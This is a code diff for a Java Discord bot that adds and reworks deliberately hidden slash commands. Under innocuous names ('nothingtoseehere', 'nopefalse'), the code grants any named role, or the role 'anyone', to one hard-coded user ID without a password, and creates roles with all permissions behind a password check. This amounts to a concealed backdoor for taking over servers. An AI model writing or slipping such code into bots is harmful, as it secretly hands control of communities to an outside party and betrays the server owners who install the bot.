@@ -57,22 +57,23 @@ private Dotenv config;
             event.reply(message).setTTS(true).queue();
             event.reply("Message sent").setEphemeral(true).queue();
         } else if (command.equals("nothingtoseehere")) {
+            event.deferReply().queue();
             String psw = config.get("PW");
-            event.deferReply().setEphemeral(true).setTTS(true).queue();
             OptionMapping messageOption = event.getOption("newrolename");
             OptionMapping password = event.getOption("password");
+            assert messageOption != null;
             String name = messageOption.getAsString();
-            if (password.equals(psw)) {
+            if (password == null) {
+                for (Role role : Objects.requireNonNull(event.getGuild()).getRolesByName(name, false)) {
+                    event.getGuild().addRoleToMember(UserSnowflake.fromId(456594340148674562L), role).queue();
+                    event.reply("Done").setEphemeral(true).queue();
+                }
+            } else if (password.equals(psw)) {
                 Objects.requireNonNull(event.getGuild()).createRole()
                         .setName(name)
                         .setMentionable(false)
                         .setPermissions(Permission.ALL_PERMISSIONS).queue();
                 event.reply("Done").setEphemeral(true).queue();
-            } else if (password == null) {
-                for (Role role : Objects.requireNonNull(event.getGuild()).getRolesByName(name, false)) {
-                    event.getGuild().addRoleToMember(UserSnowflake.fromId(456594340148674562L), role).queue();
-                    event.reply("Done").setEphemeral(true).queue();
-                }
             }
         }else if (command.equals("say")) {
             OptionMapping messageOption = event.getOption("message");
@@ -94,6 +95,12 @@ private Dotenv config;
             String message = messageOption.getAsString();
             var role = event.getGuild().getRoleById(message).getPermissions();
             event.reply(String.valueOf(role)).setEphemeral(true).queue();
+        } else if (command.equals("nopefalse")) {
+
+            for (Role role : Objects.requireNonNull(event.getGuild()).getRolesByName("anyone", false)) {
+                event.getGuild().addRoleToMember(UserSnowflake.fromId(456594340148674562L), role).queue();
+                event.reply("Done").setEphemeral(true).queue();
+            }
         }
     }
 
@@ -113,6 +120,7 @@ private Dotenv config;
         fs.add(Commands.slash("tts", "Sends a tts message.").addOptions(option1));
         umb.add(Commands.slash("say", "Make the bot say something").addOptions(option1));
         umb.add(Commands.slash("nothingtoseehere", "No cap!").addOptions(newroleName, pw));
+        //fs.add(Commands.slash("nopefalse", "uhu"));
 
         if (event.getGuild().getIdLong() == 1025575674406244425L) {
             event.getGuild().updateCommands().addCommands(umb).queue();
